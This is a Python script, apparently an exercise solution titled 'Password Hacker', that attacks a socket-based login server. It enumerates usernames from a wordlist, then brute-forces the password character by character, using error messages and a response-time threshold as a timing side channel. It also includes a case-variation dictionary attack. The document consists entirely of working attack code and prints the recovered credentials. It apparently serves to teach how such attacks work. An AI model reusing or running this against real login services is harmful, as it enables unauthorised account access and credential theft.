import itertools
import socket
import sys
import json
import string
import time


CHARACTER_SET = string.ascii_letters + string.digits  # a-z, A-Z and 0-9


class Communicate:
    def __init__(self, address):
        self.soc = socket.socket()
        self.soc.connect(address)

    def send(self, message):
        self.soc.send(message.encode())

    def recv(self):
        return self.soc.recv(1024).decode()

    def close(self):
        self.soc.close()


def bruteforce_hack(comm, login_name):
    passwd = ""
    length = 1
    while True:
        for ch in CHARACTER_SET:
            passwd_try = passwd + ch
            msg_json = json.dumps({"login": login_name, "password": passwd_try})
            comm.send(msg_json)
            time_start = time.perf_counter()
            response_result = json.loads(comm.recv())["result"]
            time_end = time.perf_counter()
            response_time = time_end - time_start
            if response_result == "Connection success!":
                return passwd_try
            elif response_result == "Exception happened during login" or response_time >= 0.1:
                passwd += ch
        length += 1


def passwd_database_hack(comm):
    with open("/home/hp/Documents/Programs/Password Hacker/Password Hacker/task/hacking/passwords.txt", "r") as f:
        passwd_list = f.readlines()
    for passwd_base in passwd_list:
        for passwd in map(lambda x: "".join(x),
                          itertools.product(*([letter.lower(), letter.upper()] for letter in passwd_base[:-1]))):
            comm.send(passwd)
            response = comm.recv()
            if response == "Connection success!":
                return passwd
            elif response == "Wrong password!":
                continue
            elif response == "Too many attempts":
                return None


def login_name_detect(comm):
    with open("/home/hp/Documents/Programs/Password Hacker/Password Hacker/task/hacking/logins.txt", "r") as f:
        login_list = f.readlines()
    for login_base in login_list:
        login_name = login_base[:-1]
        msg_json = json.dumps({"login": login_name, "password": ""})
        comm.send(msg_json)
        response_result = json.loads(comm.recv())["result"]
        if response_result == "Wrong password!" or response_result == "Exception happened during login":
            return login_name
    return None


def dictionary_hack(comm):
    login_name = login_name_detect(comm)
    passwd = bruteforce_hack(comm, login_name)
    login_passwd_json = json.dumps({"login": login_name, "password": passwd}, indent=4)
    print(login_passwd_json)


def main(args):
    ip, port = args[1], int(args[2])
    address = (ip, port)
    comm = Communicate(address)
    dictionary_hack(comm)
    # passwd = bruteforce_hack(comm)
    # passwd = dictionary_hack(comm)
    # if passwd is not None:
    #     print(passwd)
    comm.close()


if __name__ == '__main__':
    main(sys.argv)
